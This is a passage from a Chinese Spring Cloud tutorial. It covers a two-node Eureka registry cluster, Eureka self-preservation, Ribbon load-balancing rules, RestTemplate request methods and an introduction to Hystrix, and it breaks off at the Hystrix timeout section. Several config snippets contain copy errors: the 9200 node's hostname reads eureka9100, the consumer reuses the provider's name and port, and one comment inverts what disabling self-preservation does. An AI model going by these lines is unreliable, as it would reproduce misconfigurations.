<h2 id="4-2-Eureka注册中心高可用集群搭建"><a href="#4-2-Eureka注册中心高可用集群搭建" class="headerlink" title="4.2 Eureka注册中心高可用集群搭建"></a>4.2 Eureka注册中心高可用集群搭建</h2><p>我们知道，Eureka注册中心高可用集群就是各个注册中心相互注册，所以：</p>
<ol>
<li><p>创建2个SpringBoot 的Eureka的服务端项目分别为：</p>
<p>03-springcloud-eureka-server-cluster-9100</p>
<p>03-springcloud-eureka-server-cluster-9200</p>
</li>
<li><p>分别添加依赖包</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;</span><br><span class="line">        &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br><span class="line">&lt;dependencyManagement&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;$&#123;spring-cloud.version&#125;&lt;/version&gt;</span><br><span class="line">            &lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">            &lt;scope&gt;<span class="keyword">import</span>&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">&lt;/dependencyManagement&gt;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>分别修改2个项目的application.properties文件</p>
<p>03-springcloud-eureka-server-cluster-9100 的application.properties</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#内嵌定时tomcat的端口</span><br><span class="line">server.port=<span class="number">9100</span></span><br><span class="line">#设置该服务注册中心的hostname</span><br><span class="line">eureka.instance.hostname=eureka9100</span><br><span class="line">#由于我们目前创建的应用是一个服务注册中心，而不是普通的应用，默认情况下，这个应用会向注册中心（也是它自己）注册它自己，设置为<span class="literal">false</span>表示禁止这种自己向自己注册的默认行为</span><br><span class="line">eureka.client.register-with-eureka=<span class="literal">false</span></span><br><span class="line">#表示不去检索其他的服务，因为服务注册中心本身的职责就是维护服务实例，它不需要去检索其他服务</span><br><span class="line">eureka.client.fetch-registry=<span class="literal">false</span></span><br><span class="line">#指定服务注册中心的位置</span><br><span class="line">eureka.client.service-url.defaultZone=http:<span class="comment">//eureka9200:9200/eureka</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>03-springcloud-eureka-server-cluster-9200 的application.properties </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#内嵌定时tomcat的端口</span><br><span class="line">server.port=<span class="number">9200</span></span><br><span class="line">#设置该服务注册中心的hostname</span><br><span class="line">eureka.instance.hostname=eureka9100</span><br><span class="line">#由于我们目前创建的应用是一个服务注册中心，而不是普通的应用，默认情况下，这个应用会向注册中心（也是它自己）注册它自己，设置为<span class="literal">false</span>表示禁止这种自己向自己注册的默认行为</span><br><span class="line">eureka.client.register-with-eureka=<span class="literal">false</span></span><br><span class="line">#表示不去检索其他的服务，因为服务注册中心本身的职责就是维护服务实例，它不需要去检索其他服务</span><br><span class="line">eureka.client.fetch-registry=<span class="literal">false</span></span><br><span class="line">#指定服务注册中心的位置</span><br><span class="line">eureka.client.service-url.defaultZone=http:<span class="comment">//eureka9100:9100/eureka</span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>然后在本地hosts文件配置：C:\Windows\System32\drivers\etc\hosts</p>
<p><strong>127.0.0.1 eureka9100</strong></p>
<p><strong>127.0.0.1 eureka9200</strong></p>
</li>
</ol>
<p>分别启动两个注册中心，访问两个注册中心页面，观察注册中心页面是否正常；</p>
<p><a href="http://eureka9100:9100/">http://eureka9100:9100</a></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212134876.png" alt="image-20201216210609548"> </p>
<p><a href="http://eureka9200:9200/">http://eureka9200:9200</a></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212134877.png" alt="image-20201216210628585">  </p>
<h2 id="4-3-Eureka注册中心高可用集群测试"><a href="#4-3-Eureka注册中心高可用集群测试" class="headerlink" title="4.3 Eureka注册中心高可用集群测试"></a>4.3 Eureka注册中心高可用集群测试</h2><p>服务端配置号以后需要进行注册的服务中配置：</p>
<ol>
<li><p>创建服务的生产者项目SpringBoot项目</p>
<p>03-springcloud-eureka-client-cluster-provider</p>
</li>
<li><p>添加依赖包</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  &lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;</span><br><span class="line">        &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br><span class="line">&lt;dependencyManagement&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;$&#123;spring-cloud.version&#125;&lt;/version&gt;</span><br><span class="line">            &lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">            &lt;scope&gt;<span class="keyword">import</span>&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">&lt;/dependencyManagement&gt;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>修改application.properties文件</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">spring.application.name=<span class="number">03</span>-springcloud-eureka-client-cluster-provider</span><br><span class="line">#将服务同时注册到多个注册中心,其实当Eureka注册中心实现集群以后，那么将服务注册到任意一个Eureka的注册中心后，数据服务都会</span><br><span class="line">#同步到其他的Eureka注册中心，但是实际应用时还是建议将服务分别注册到全部的Eureka集群的所有服务中，这个防止某个以Eureka出现</span><br><span class="line">#故障后服务仍然可以注册成功</span><br><span class="line">eureka.client.service-url.defaultZone=http:<span class="comment">//eureka9100:9100/eureka/,http://eureka9200:9200/eureka/</span></span><br><span class="line">#指定Tomcat的端口号需要避免和其他的Tomcat端口冲突</span><br><span class="line">server.port=<span class="number">8081</span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>创建服务的消费者项目SpringBoot项目</p>
<p>03-springcloud-eureka-client-cluster-consumer</p>
</li>
<li><p>添加依赖包</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  &lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;</span><br><span class="line">        &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br><span class="line">&lt;dependencyManagement&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;$&#123;spring-cloud.version&#125;&lt;/version&gt;</span><br><span class="line">            &lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">            &lt;scope&gt;<span class="keyword">import</span>&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">&lt;/dependencyManagement&gt;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>修改application.properties文件</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">spring.application.name= <span class="number">03</span>-springcloud-eureka-client-cluster-provider</span><br><span class="line"></span><br><span class="line">#将服务同时注册到多个注册中心,其实当Eureka注册中心实现集群以后，那么将服务注册到任意一个Eureka的注册中心后，数据服务都会</span><br><span class="line">#同步到其他的Eureka注册中心，但是实际应用时还是建议将服务分别注册到全部的Eureka集群的所有服务中，这个防止某个以Eureka出现</span><br><span class="line">#故障后服务仍然可以注册成功</span><br><span class="line">eureka.client.service-url.defaultZone=http:<span class="comment">//eureka9100:9100/eureka/,http://eureka9200:9200/eureka/</span></span><br><span class="line">#指定Tomcat的端口号需要避免和其他的Tomcat端口冲突</span><br><span class="line">server.port=<span class="number">8081</span></span><br></pre></td></tr></table></figure>

<p>启动服务提供者服务，然后观察注册中心页面，可以看到服务会在两个注册中心上都注册成功；</p>
<h2 id="4-4-Eureka服务注册中心自我保护机制"><a href="#4-4-Eureka服务注册中心自我保护机制" class="headerlink" title="4.4 Eureka服务注册中心自我保护机制"></a>4.4 Eureka服务注册中心自我保护机制</h2><p>自我保护机制是Eureka注册中心的重要特性，当Eureka注册中心进入自我保护模式时，在Eureka Server首页会输出如下警告信息：</p>
<p>EMERGENCY! EUREKA MAY BE INCORRECTLY CLAIMING INSTANCES ARE UP WHEN THEY’RE NOT. RENEWALS ARE LESSER THAN THRESHOLD AND HENCE THE INSTANCES ARE NOT BEING EXPIRED JUST TO BE SAFE.</p>
<p>emergency! eureka may be incorrectly claiming instances are up when they’re not. renewals are lesser than threshold and hence the instances are not being expired just to be safe.</p>
<p>在没有Eureka自我保护的情况下，如果Eureka Server在一定时间内没有接收到某个微服务实例的心跳，Eureka Server将会注销该实例，但是当发生网络分区故障时，那么微服务与Eureka Server之间将无法正常通信，以上行为可能变得非常危险了——因为微服务本身其实是正常的，此时不应该注销这个微服务，如果没有自我保护机制，那么Eureka Server就会将此服务注销掉。</p>
<p>Eureka通过“自我保护模式”来解决这个问题——当Eureka Server节点在短时间内丢失过多客户端时（可能发生了网络分区故障），那么就会把这个微服务节点进行保护。一旦进入自我保护模式，Eureka Server就会保护服务注册表中的信息，不删除服务注册表中的数据（也就是不会注销任何微服务）。当网络故障恢复后，该Eureka Server节点会再自动退出自我保护模式。</p>
<p>所以，自我保护模式是一种应对网络异常的安全保护措施，它的架构哲学是宁可同时保留所有微服务（健康的微服务和不健康的微服务都会保留），也不盲目注销任何健康的微服务，使用自我保护模式，可以让Eureka集群更加的健壮、稳定。</p>
<p>当然也可以使用配置项：<strong>eureka.server.enable-self-preservation &#x3D; false</strong> 禁用自我保护模式。</p>
<p>但是Eureka Server 自我保护模式也会给我们带来一些困扰，如果在保护期内某个服务提供者刚好非正常下线了，此时服务消费者就会拿到一个无效的服务实例，此时会调用失败，对于这个问题需要服务消费者端具有一些容错机制，如重试，断路器等。</p>
<p>Eureka的自我保护模式是有意义的，该模式被激活后，它不会从注册列表中剔除因长时间没收到心跳导致注册过期的服务，而是等待修复，直到心跳恢复正常之后，它自动退出自我保护模式。这种模式旨在避免因网络分区故障导致服务不可用的问题。</p>
<p>例如，两个微服务客户端实例A和B之间有调用的关系，A是消费者，B是提供者，但是由于网络故障，B未能及时向Eureka发送心跳续约，这时候Eureka 不能简单的将B从注册表中剔除，因为如果剔除了，A就无法从Eureka 服务器中获取B注册的服务，但是这时候B服务是可用的；</p>
<p>所以，Eureka的自我保护模式最好还是开启它。</p>
<p>关于自我保护常用几个配置如下：</p>
<p>分别修改2个Eureka服务服务端的application.properties文件增加一下配置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#关闭自我保护模式 作用是如果开启了自我保护模式以后，那么如果服务的提供者或消费者（Eureka的客户端）因为网络波动问题</span><br><span class="line">#暂时失去了与服务器端的连接那么Eureka就会直接注销这个服务删除这个服务相关的数据，如果关闭了这个自我保护，Eureka只</span><br><span class="line">#会先挂起这个服务，当网络恢复正常以后这个服务将自动的恢复</span><br><span class="line">eureka.server.enable-self-preservation = <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>分别修改服务提供者和服务消费项目的application.properties文件添加一下配置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#每间隔2s，向服务端发送一次心跳，证明自己依然<span class="string">&quot;存活&quot;</span></span><br><span class="line">eureka.instance.lease-renewal-interval-in-seconds=<span class="number">2</span></span><br><span class="line">#告诉服务端，如果我10s之内没有给你发心跳，就代表我故障了，将我踢出掉</span><br><span class="line">eureka.instance.lease-expiration-duration-in-seconds=<span class="number">10</span></span><br></pre></td></tr></table></figure>

<h1 id="第五章：客户端负载均衡Ribbon"><a href="#第五章：客户端负载均衡Ribbon" class="headerlink" title="第五章：客户端负载均衡Ribbon"></a>第五章：客户端负载均衡Ribbon</h1><h2 id="5-1-Spring-Cloud中的Ribbon是什么？"><a href="#5-1-Spring-Cloud中的Ribbon是什么？" class="headerlink" title="5.1 Spring Cloud中的Ribbon是什么？"></a>5.1 Spring Cloud中的Ribbon是什么？</h2><p>我们通常说的负载均衡是指将一个请求均匀地分摊到不同的节点单元上执行，负载均和分为硬件负载均衡和软件负载均衡：</p>
<p><strong>硬件负载均衡</strong>：比如 F5、深信服、Array 等；</p>
<p><strong>软件负载均衡</strong>：比如 Nginx、LVS、HAProxy 等；</p>
<p>硬件负载均衡或是软件负载均衡，他们都会维护一个可用的服务端清单，通过心跳检测来剔除故障的服务端节点以保证清单中都是可以正常访问的服务端节点。当客户端发送请求到负载均衡设备的时候，该设备按某种算法（比如轮询、权重、 最小连接数等）从维护的可用服务端清单中取出一台服务端的地址，然后进行转发。</p>
<p>Ribbon是Netflix发布的开源项目，主要功能是提供客户端的软件负载均衡算法，是一个基于HTTP和TCP的客户端负载均衡工具。</p>
<p>Spring Cloud对Ribbon做了二次封装，可以让我们使用RestTemplate的服务请求，自动转换成客户端负载均衡的服务调用。</p>
<p>Ribbon支持多种负载均衡算法，还支持自定义的负载均衡算法。</p>
<p>Ribbon只是一个工具类框架，比较小巧，Spring Cloud对它封装后使用也非常方便，它不像服务注册中心、配置中心、API网关那样需要独立部署，Ribbon只需要在代码直接使用即可；</p>
<h3 id="Ribbon-与-Nginx-的区别"><a href="#Ribbon-与-Nginx-的区别" class="headerlink" title="Ribbon 与 Nginx 的区别"></a>Ribbon 与 Nginx 的区别</h3><p>Nginx的官方正确读音是“恩静埃克斯”即“ Engine X</p>
<p>Ribbon是客户端的负载均衡工具，而客户端负载均衡和服务端负载均衡最大的区别在于服务清单所存储的位置不同，在客户端负载均衡中，所有客户端节点下的服务端清单，需要自己从服务注册中心上获取，比如Eureka服务注册中心。同服务端负载均衡的架构类似，在客户端负载均衡中也需要心跳去维护服务端清单的健康性，只是这个步骤需要与服务注册中心配合完成。在Spring Cloud中，由于Spring Cloud对Ribbon做了二次封装，所以默认会创建针对Ribbon的自动化整合配置；</p>
<p>在Spring Cloud中，Ribbon主要与RestTemplate对象配合起来使用，Ribbon会自动化配置RestTemplate对象，通过@LoadBalanced开启RestTemplate对象调用时的负载均衡。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212134878.png" alt="image-20201216213130401"></p>
<p>​                               </p>
<h2 id="5-2-Ribbon实现客户端负载均衡"><a href="#5-2-Ribbon实现客户端负载均衡" class="headerlink" title="5.2 Ribbon实现客户端负载均衡"></a>5.2 Ribbon实现客户端负载均衡</h2><p>由于Spring Cloud Ribbon的封装， 我们在微服务架构中使用客户端负载均衡调用非常简单， 只需要如下两步：</p>
<ol>
<li><p>启动多个服务提供者实例并注册到一个服务注册中心或是服务注册中心集群。</p>
</li>
<li><p>服务消费者通过被＠LoadBalanced注解修饰过的RestTemplate来调用服务提供者。</p>
</li>
</ol>
<p>这样，我们就可以实现服务提供者的高可用以及服务消费者的负载均衡调用。</p>
<h2 id="5-3-Ribbon负载均衡策略"><a href="#5-3-Ribbon负载均衡策略" class="headerlink" title="5.3 Ribbon负载均衡策略"></a>5.3 Ribbon负载均衡策略</h2><p>Ribbon的负载均衡策略是由IRule接口定义, 该接口由如下实现：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212134879.png" alt="image-20201216213258692"></p>
<table>
<thead>
<tr>
<th>RandomRule</th>
<th>随机</th>
</tr>
</thead>
<tbody><tr>
<td>RoundRobinRule</td>
<td>轮询</td>
</tr>
<tr>
<td>AvailabilityFilteringRule</td>
<td>先过滤掉由于多次访问故障的服务，以及并发连接数超过阈值的服务，然后对剩下的服务按照轮询策略进行访问；</td>
</tr>
<tr>
<td>WeightedResponseTimeRule</td>
<td>根据平均响应时间计算所有服务的权重，响应时间越快服务权重就越大被选中的概率即越高，如果服务刚启动时统计信息不足，则使用RoundRobinRule策略，待统计信息足够会切换到该WeightedResponseTimeRule策略；</td>
</tr>
<tr>
<td>RetryRule</td>
<td>先按照RoundRobinRule策略分发，如果分发到的服务不能访问，则在指定时间内进行重试，分发其他可用的服务；</td>
</tr>
<tr>
<td>BestAvailableRule</td>
<td>先过滤掉由于多次访问故障的服务，然后选择一个并发量最小的服务；</td>
</tr>
<tr>
<td>ZoneAvoidanceRule</td>
<td>综合判断服务节点所在区域的性能和服务节点的可用性，来决定选择哪个服务；</td>
</tr>
</tbody></table>
<h2 id="5-4-Rest请求模板类解读"><a href="#5-4-Rest请求模板类解读" class="headerlink" title="5.4 Rest请求模板类解读"></a>5.4 Rest请求模板类解读</h2><p>当我们从服务消费端去调用服务提供者的服务的时候，使用了一个极其方便的对象叫RestTemplate，当时我们只使用了RestTemplate中最简单的一个功能getForEntity发起了一个get请求去调用服务端的数据，同时，我们还通过配置@LoadBalanced注解开启客户端负载均衡，RestTemplate的功能非常强大，那么接下来我们就来详细的看一下RestTemplate中几种常见请求方法的使用。</p>
<p>在日常操作中，基于Rest的方式通常是四种情况，它们分表是：</p>
<p><strong>GET请求 –查询数据</strong></p>
<p><strong>POST请求 –添加数据</strong></p>
<p><strong>PUT请求 – 修改数据</strong></p>
<p><strong>DELETE请求 –删除数据</strong></p>
<p>下面我们逐一解读。</p>
<h2 id="5-5-RestTemplate的GET请求"><a href="#5-5-RestTemplate的GET请求" class="headerlink" title="5.5 RestTemplate的GET请求"></a>5.5 RestTemplate的GET请求</h2><p>Get请求可以有两种方式：</p>
<p>第一种：getForEntity</p>
<p>该方法返回一个ResponseEntity<T>对象，ResponseEntity<T>是Spring对HTTP请求响应的封装，包括了几个重要的元素，比如响应码、contentType、contentLength、响应消息体等；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ResponseEntity&lt;String&gt; responseEntity = restTemplate.getForEntity(<span class="string">&quot;http://01-SPRINGCLOUD-SERVICE-PROVIDER/service/hello&quot;</span>, String.class);</span><br><span class="line"><span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> responseEntity.getBody();</span><br><span class="line"><span class="type">HttpStatus</span> <span class="variable">statusCode</span> <span class="operator">=</span> responseEntity.getStatusCode();</span><br><span class="line"><span class="type">int</span> <span class="variable">statusCodeValue</span> <span class="operator">=</span> responseEntity.getStatusCodeValue();</span><br><span class="line"><span class="type">HttpHeaders</span> <span class="variable">headers</span> <span class="operator">=</span> responseEntity.getHeaders();</span><br><span class="line"></span><br><span class="line">System.out.println(body);</span><br><span class="line">System.out.println(statusCode);</span><br><span class="line">System.out.println(statusCodeValue);</span><br><span class="line">System.out.println(headers);</span><br></pre></td></tr></table></figure>

<p>以上代码：</p>
<p>getForEntity方法第一个参数为要调用的服务的地址，即服务提供者提供的<a href="http://01-springcloud-service-provider/service/hello%E6%8E%A5%E5%8F%A3%E5%9C%B0%E5%9D%80%EF%BC%8C%E6%B3%A8%E6%84%8F%E8%BF%99%E9%87%8C%E6%98%AF%E9%80%9A%E8%BF%87%E6%9C%8D%E5%8A%A1%E5%90%8D%E8%B0%83%E7%94%A8%E8%80%8C%E4%B8%8D%E6%98%AF%E6%9C%8D%E5%8A%A1%E5%9C%B0%E5%9D%80%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%94%B9%E4%B8%BA%E6%9C%8D%E5%8A%A1%E5%9C%B0%E5%9D%80%E5%B0%B1%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8Ribbon%E5%AE%9E%E7%8E%B0%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%BA%86%E3%80%82">http://01-SPRINGCLOUD-SERVICE-PROVIDER/service/hello接口地址，注意这里是通过服务名调用而不是服务地址，如果改为服务地址就无法使用Ribbon实现客户端负载均衡了。</a></p>
<p>getForEntity方法第二个参数String.class表示希望返回的body类型是String类型，如果希望返回一个对象，也是可以的，比如User对象；</p>
<p>另外两个重载方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; ResponseEntity&lt;T&gt; <span class="title function_">getForEntity</span><span class="params">(String url, Class&lt;T&gt; responseType, Object... uriVariables)</span> <span class="keyword">throws</span> RestClientException</span><br><span class="line"> </span><br><span class="line">比如：</span><br><span class="line">Object [] params=&#123;<span class="number">1</span>,”张无忌”&#125;;</span><br><span class="line">restTemplate.getForEntity(<span class="string">&quot;http://01-SPRINGCLOUD-SERVICE-PROVIDER/service/hello?id=&#123;1&#125;&amp;name=&#123;2&#125;&quot;</span>, String.class, params).getBody();</span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; ResponseEntity&lt;T&gt; <span class="title function_">getForEntity</span><span class="params">(String url, Class&lt;T&gt; responseType, Map&lt;String, ?&gt; uriVariables)</span> <span class="keyword">throws</span> RestClientException</span><br><span class="line">比如：</span><br><span class="line">Map&lt;String, Object&gt; paramMap = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;();</span><br><span class="line">paramMap.put(<span class="string">&quot;id&quot;</span>, <span class="number">1</span>);</span><br><span class="line">paramMap.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;张无忌&quot;</span>);</span><br><span class="line">restTemplate.getForEntity(<span class="string">&quot;http://01-SPRINGCLOUD-SERVICE-PROVIDER/service/hello?id=&#123;id&#125;&amp;name=&#123;name&#125;&quot;</span>, String.class, paramMap).getBody();                         </span><br></pre></td></tr></table></figure>

<p> 第二种：getForObject()<br>与getForEntity使用类似，只不过getForObject是在getForEntity基础上进行了再次封装，可以将http的响应体body信息转化成指定的对象，方便我们的代码开发；<br>当你不需要返回响应中的其他信息，只需要body体信息的时候，可以使用这个更方便；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">它也有两个重载的方法，和getForEntity相似；</span><br><span class="line">&lt;T&gt; T <span class="title function_">getForObject</span><span class="params">(URI url, Class&lt;T&gt; responseType)</span> <span class="keyword">throws</span> RestClientException;</span><br><span class="line"> </span><br><span class="line">&lt;T&gt; T <span class="title function_">getForObject</span><span class="params">(String url, Class&lt;T&gt; responseType, Object... uriVariables)</span> <span class="keyword">throws</span> RestClientException;</span><br><span class="line"> </span><br><span class="line">&lt;T&gt; T <span class="title function_">getForObject</span><span class="params">(String url, Class&lt;T&gt; responseType, Map&lt;String, ?&gt; uriVariables)</span> <span class="keyword">throws</span> RestClientException;</span><br></pre></td></tr></table></figure>

<h2 id="5-6-RestTemplate的POST请求："><a href="#5-6-RestTemplate的POST请求：" class="headerlink" title="5.6 RestTemplate的POST请求："></a>5.6 RestTemplate的POST请求：</h2><p>Post与Get请求非常类似：</p>
<p>restTemplate.postForObject()</p>
<p>restTemplate.postForEntity()</p>
<p>restTemplate.postForLocation()</p>
<h2 id="5-7-RestTemplate的PUT请求："><a href="#5-7-RestTemplate的PUT请求：" class="headerlink" title="5.7 RestTemplate的PUT请求："></a>5.7 RestTemplate的PUT请求：</h2><p>restTemplate.put();</p>
<h2 id="5-8-RestTemplate的DELETE请求："><a href="#5-8-RestTemplate的DELETE请求：" class="headerlink" title="5.8 RestTemplate的DELETE请求："></a>5.8 RestTemplate的DELETE请求：</h2><p>restTemplate.delete();</p>
<h1 id="第六章-服务熔断Hystrix"><a href="#第六章-服务熔断Hystrix" class="headerlink" title="第六章 服务熔断Hystrix"></a>第六章 服务熔断Hystrix</h1><h2 id="6-1-Hystrix是什么"><a href="#6-1-Hystrix是什么" class="headerlink" title="6.1 Hystrix是什么"></a>6.1 Hystrix是什么</h2><p>在微服务架构中，我们是将一个单体应用拆分成多个服务单元，各个服务单元之间通过注册中心彼此发现和消费对方提供的服务，每个服务单元都是单独部署，在各自的服务进程中运行，服务之间通过远程调用实现信息交互，那么当某个服务的响应太慢或者故障，又或者因为网络波动或故障，则会造成调用者延迟或调用失败，当大量请求到达，则会造成请求的堆积，导致调用者的线程挂起，从而引发调用者也无法响应，调用者也发生故障。</p>
<p>比如电商中的用户下订单，我们有两个服务，一个下订单服务，一个减库存服务，当用户下订单时调用下订单服务，然后下订单服务又调用减库存服务，如果减库存服务响应延迟或者没有响应，则会造成下订单服务的线程挂起等待，如果大量的用户请求下订单，或导致大量的请求堆积，引起下订单服务也不可用，如果还有另外一个服务依赖于订单服务，比如用户服务，它需要查询用户订单，那么用户服务查询订单也会引起大量的延迟和请求堆积，导致用户服务也不可用。</p>
<p>所以在微服务架构中，很容易造成服务故障的蔓延，引发整个微服务系统瘫痪不可用。</p>
<p>为了解决此问题，微服务架构中引入了一种叫熔断器的服务保护机制。</p>
<p>熔断器也有叫断路器，他们表示同一个意思，最早来源于微服务之父Martin Fowler的论文CircuitBreaker一文。“熔断器”本身是一种开关装置，用于在电路上保护线路过载，当线路中有电器发生短路时，能够及时切断故障电路，防止发生过载、发热甚至起火等严重后果。</p>
<p>微服务架构中的熔断器，就是当被调用方没有响应，调用方直接返回一个错误响应即可，而不是长时间的等待，这样避免调用时因为等待而线程一直得不到释放，避免故障在分布式系统间蔓延；</p>
<p>Spring Cloud Hystrix实现了熔断器、线程隔离等一系列服务保护功能。该功能也是基于Netflix的开源框架Hystrix实现的，该框架的目标在于通过控制那些访问远程系统、服务和第三方库的节点，从而对延迟和故障提供更强大的容错能力。Hystrix具备服务降级、服务熔断、线程和信号隔离、请求缓存、请求合并以及服务监控等强大功能。</p>
<h2 id="6-2-Hystrix快速入门"><a href="#6-2-Hystrix快速入门" class="headerlink" title="6.2 Hystrix快速入门"></a>6.2 Hystrix快速入门</h2><p>在SpringCloud中使用熔断器Hystrix是非常简单和方便的，只需要简单两步即可：</p>
<ol>
<li>添加依赖</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;!--Spring Cloud熔断器起步依赖--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">   &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">   &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt;</span><br><span class="line"> &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>



<ol start="2">
<li>在入口类中使用@EnableCircuitBreaker注解开启断路器功能，也可以使用一个名为@SpringCloudApplication的注解代替主类上的三个注解；</li>
<li>在调用远程服务的方法上添加注解：@HystrixCommand(fallbackMethod&#x3D;”error”)</li>
</ol>
<h2 id="6-3-服务消费者Hystrix测试"><a href="#6-3-服务消费者Hystrix测试" class="headerlink" title="6.3 服务消费者Hystrix测试"></a>6.3 服务消费者Hystrix测试</h2><p>hystrix默认超时时间是1000毫秒，如果你后端的响应超过此时间，就会触发断路器；</p>
<p>修改hystrix的默认超时时间：</p>
